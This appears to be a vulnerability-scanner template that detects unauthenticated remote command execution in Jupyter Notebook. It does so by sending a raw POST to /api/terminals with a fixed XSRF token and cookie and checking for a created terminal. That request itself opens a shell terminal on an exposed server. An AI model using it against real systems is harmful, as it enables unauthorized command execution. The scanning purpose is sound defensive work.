id: jupyter-notebook-rce
info:
  name: Jupyter Notebook RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Detects unauthorized access and remote command execution vulnerability in Jupyter Notebook.
    Reference: http://wiki.peiqi.tech/wiki/webapp/Jupyter%20Notebook/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html

http:
  - raw:
      - |
        POST /api/terminals HTTP/1.1
        Host: {{Hostname}}
        X-XSRFToken: 2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
        Cookie: _xsrf=2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
        Content-Type: application/json

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - contains(body, 'name')
          - contains(body, 'last_activity')
      - type: status
        status:
          - 200
